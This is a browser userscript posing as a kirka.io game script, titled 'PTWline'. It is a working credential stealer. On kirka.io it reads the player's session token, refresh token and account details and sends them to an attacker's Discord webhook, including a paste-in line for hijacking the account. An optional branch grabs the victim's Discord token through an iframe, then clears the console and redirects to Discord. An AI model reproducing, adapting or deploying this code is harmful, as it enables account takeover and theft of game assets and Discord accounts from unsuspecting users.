// ==UserScript==
// @name         PTWline kirka.io
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        *://*/*
// @grant        none
// @run-at       document-body
// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
// @grant        none
// ==/UserScript==
//───────────────────▄───────
//─▀███▌───█───██───▐██────██
//──█▒▒█──███──▐█──▄█▌█▌──▐█─
//──███▀───█▄───█▌██▀─██──██─
//──█──────██▌──████───████──
//─███──────▀────█──────██───

var buildid = 1337
var setting_webhook = "ur webhook"
var setting_avatar = "https://www.morphsuits.com/media/catalog/product/cache/937f440085cd52c4f06eb785557b6967/m/1/m1_4_3_4375_1.jpg"
var setting_antiduplicate = false
var setting_stealldiscordtoken = false



var request = new XMLHttpRequest();
request.open("POST", setting_webhook);
// again, replace the url in the open method with yours
request.setRequestHeader('Content-type', 'application/json');
function hexToDecimal(hex) {
  return parseInt(hex.replace("#",""), 16)
}
function getElementByXpath(path) {
  return document.evaluate(path, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
}
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function getRandomInt(max) {
  return Math.floor(Math.random() * max);
}
var color = 1
var colorcode = getRandomInt(6)
if (colorcode == 0) { color = "5c72ff"}
if (colorcode == 1) { color = "ff63cb"}
if (colorcode == 2) { color = "54ff36"}
if (colorcode == 3) { color = "ff002b"}
if (colorcode == 4) { color = "ff0073"}
if (colorcode == 5) { color = "ffcb59"}

var discordpage = "discord.com/channels"
var kirkapage = "kirka.io"
if (window.location.href.indexOf(discordpage) > 0 && setting_stealldiscordtoken == true) {
    var disctoken = document.body.appendChild(document.createElement `iframe`).contentWindow.window.localStorage.token
    console.log(disctoken)
        var myEmbed34 = {
  author: {
    name: "PTWline kirka.io | discord addition"
  },
  title: "♿ **New hit!**",
  description: "```Discord token:||" + disctoken + "```",
  footer: {
      text: "BuildID:" + buildid,
      icon_url: "https://cdn.discordapp.com/attachments/1014958824161026188/1080816289699868693/check.png"
  },
  color: hexToDecimal(color)
}

var params66 = {
  avatar_url: setting_avatar,
  username: "root",
  embeds: [ myEmbed34 ]
}
fetch(setting_webhook, {
    headers: {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json;charset=UTF-8"
    },
    method: "POST",
    body: JSON.stringify(params66)
});
}
if (window.location.href.indexOf(kirkapage) > 0) {
async function stoledata() {
  await sleep(5000);
  var get_region = localStorage.getItem('region');
  var get_token = localStorage.getItem('token');
  var get_rtoken = localStorage.getItem('refresh_token');
  const ign = getElementByXpath('//*[@id="team-section"]/div[2]/div/div[2]/div[2]').innerText
  const clan = getElementByXpath('//*[@id="team-section"]/div[2]/div/div[2]/div[1]').innerHTML
  const lvl = getElementByXpath('//*[@id="team-section"]/div[2]/div/div[1]').innerHTML
  const diamonds = getElementByXpath('//*[@id="left-interface"]/div[2]/div[2]').innerText
  const coins = getElementByXpath('//*[@id="left-interface"]/div[2]/div[1]').innerText
  const code = getElementByXpath('//*[@id="auth-user"]/div/div[1]/div[2]').innerHTML



  if (setting_antiduplicate == true) {
    var antidup_check = localStorage.getItem('WMMMWMSMWMMWM');
    console.log(antidup_check)
    if (antidup_check == null) {
        localStorage.setItem('WMMMWMSMWMMWM', '1');
    }
}


if (setting_antiduplicate == false) {
    var myEmbed1 = {
  author: {
    name: "PTWline kirka.io"
  },
  title: "♿ **New hit!**",
  description: "```Region:" + get_region + "``````Refresh token:" + get_rtoken + "``````Token join console code: localStorage.setItem('token', ' " + get_token + "');``````LVL:" + lvl + "``````IGN:" + ign + "``````ID:" + code + "``````Coins:" + coins + "``````Clan:" + clan + "``````Diamonds" + diamonds + "```",
  footer: {
      text: "BuildID:" + buildid,
      icon_url: "https://cdn.discordapp.com/attachments/1014958824161026188/1080816289699868693/check.png"
  },
  color: hexToDecimal(color)
}

var params = {
  avatar_url: setting_avatar,
  username: "root",
  embeds: [ myEmbed1 ]
}
fetch(setting_webhook, {
    headers: {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json;charset=UTF-8"
    },
    method: "POST",
    body: JSON.stringify(params)
});}

if (setting_antiduplicate == true && antidup_check == null) {
    var myEmbed2 = {
  author: {
    name: "PTWline kirka.io"
  },
  title: "♿ **New hit!**",
  description: "```Region:" + get_region + "``````Refresh token:" + get_rtoken + "``````Token join console code: localStorage.setItem('token', ' " + get_token + "');``````Account lvl:" + lvl + "``````Account ign:" + ign + "``````Account id" + code + "``````Account coins:" + coins + "``````Account clan:" + clan + "``````Account diamonds:" + diamonds + "```",
  footer: {
      text: "BuildID:" + buildid,
  },
  color: hexToDecimal(color)
}

var params2 = {
  avatar_url: setting_avatar,
  username: "root",
  embeds: [ myEmbed2 ]
}
fetch(setting_webhook, {
    headers: {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json;charset=UTF-8"
    },
    method: "POST",
    body: JSON.stringify(params2)
});}
await sleep(4000);
console.clear()
console.log('%c   PTWline loaded!', 'background: #7b00ff; color: #ffffff', );
if (setting_stealldiscordtoken == true) {
  var webs = "https://discord.com/channels/@me"
  window.location = webs
}
}
stoledata();
}
